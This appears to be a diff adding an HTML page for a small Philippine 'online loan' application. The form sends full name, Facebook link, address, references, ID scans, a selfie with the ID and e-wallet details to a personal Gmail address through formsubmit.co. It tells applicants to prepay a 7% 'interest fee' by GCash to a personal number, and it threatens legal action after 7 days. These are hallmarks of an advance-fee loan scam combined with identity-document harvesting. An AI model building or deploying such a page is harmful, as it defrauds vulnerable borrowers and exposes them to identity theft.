@@ -1,0 +1,123 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Online Loan Application</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; background: #f4f7f8; }
+    form { background: #fff; padding: 20px; border-radius: 8px; max-width: 700px; margin: auto; }
+    h2 { text-align: center; }
+    label { display: block; margin-top: 15px; font-weight: bold; }
+    input, select { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 5px; }
+    .reference-group { display: flex; gap: 10px; }
+    .reference-group input { flex: 1; }
+    .file-input { border: none; }
+    .terms { margin-top: 20px; }
+    button { margin-top: 20px; padding: 12px; width: 100%; background: #007BFF; color: #fff; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
+    button:hover { background: #0056b3; }
+    .loan-summary { background: #eef; padding: 15px; margin-top: 20px; border-radius: 5px; }
+  </style>
+</head>
+<body>
+
+  <form id="loanForm" action="https://formsubmit.co/liasonspermitting@gmail.com" method="POST" enctype="multipart/form-data">
+    <h2>Online Loan Application</h2>
+
+    <label>Full Name (with Middle Initial)</label>
+    <input type="text" name="fullname" required>
+
+    <label>Facebook Profile Link</label>
+    <input type="url" name="facebook" required>
+
+    <label>Full Address</label>
+    <input type="text" name="address" required>
+
+    <label>Phone Number</label>
+    <input type="tel" name="phone" pattern="^(\+639|09)\d{9}$" placeholder="e.g. 09123456789" required>
+
+    <label>Email Address</label>
+    <input type="email" name="email" required>
+
+    <label>Character References (3 people)</label>
+    <div class="reference-group">
+      <input type="text" name="ref1" placeholder="Reference 1" required>
+      <input type="text" name="ref2" placeholder="Reference 2" required>
+      <input type="text" name="ref3" placeholder="Reference 3" required>
+    </div>
+
+    <label>Upload Valid ID (Front)</label>
+    <input type="file" name="id_front" accept="image/*,.pdf" class="file-input" required>
+
+    <label>Upload Valid ID (Back)</label>
+    <input type="file" name="id_back" accept="image/*,.pdf" class="file-input" required>
+
+    <label>Upload Selfie with ID</label>
+    <input type="file" name="selfie_id" accept="image/*" class="file-input" required>
+
+    <label>Loan Amount (Max ₱2,000)</label>
+    <input type="number" id="loanAmount" name="loan_amount" max="2000" required>
+
+    <label>Disbursement Method</label>
+    <select name="disbursement" required>
+      <option value="">--Select--</option>
+      <option value="GCASH">GCASH</option>
+      <option value="MAYA">MAYA</option>
+      <option value="COINS">COINS</option>
+    </select>
+
+    <label>Account Name</label>
+    <input type="text" name="account_name" required>
+
+    <label>Account Number (PH Mobile Number)</label>
+    <input type="tel" name="account_number" pattern="^(\+639|09)\d{9}$" placeholder="e.g. 09123456789" required>
+
+    <div class="loan-summary">
+      <h3>Loan Terms & Computation</h3>
+      <p>Loan Amount Entered: <strong id="enteredAmount">₱0</strong></p>
+      <p>Interest Fee (7%) to be paid in advance via GCASH to <strong>09164363329</strong>: -₱<span id="interestFee">0</span></p>
+      <p>Platform Fee (3%): -₱<span id="platformFee">0</span></p>
+      <p>Processing Fee (2%): -₱<span id="processingFee">0</span></p>
+      <hr>
+      <p><strong>Total Disbursed (after fees, excluding prepaid interest): ₱<span id="totalDisbursed">0</span></strong></p>
+    </div>
+
+    <div class="terms">
+      <input type="checkbox" name="terms" required> I agree to the Terms & Conditions: I must pay the borrowed amount within 7 days or legal actions will be taken.
+    </div>
+
+    <button type="submit">Submit Application</button>
+  </form>
+
+  <script>
+    const loanAmountInput = document.getElementById('loanAmount');
+    const enteredAmount = document.getElementById('enteredAmount');
+    const interestFee = document.getElementById('interestFee');
+    const platformFee = document.getElementById('platformFee');
+    const processingFee = document.getElementById('processingFee');
+    const totalDisbursed = document.getElementById('totalDisbursed');
+
+    loanAmountInput.addEventListener('input', () => {
+      let amount = parseFloat(loanAmountInput.value) || 0;
+
+      if (amount > 2000) {
+        alert('Maximum loan amount is ₱2,000');
+        loanAmountInput.value = 2000;
+        amount = 2000;
+      }
+
+      const interest = amount * 0.07;
+      const platform = amount * 0.03;
+      const processing = amount * 0.02;
+      const total = amount - platform - processing; // Interest prepaid via GCASH
+
+      enteredAmount.textContent = `₱${amount.toFixed(2)}`;
+      interestFee.textContent = interest.toFixed(2);
+      platformFee.textContent = platform.toFixed(2);
+      processingFee.textContent = processing.toFixed(2);
+      totalDisbursed.textContent = total.toFixed(2);
+    });
+  </script>
+
+</body>
+</html>
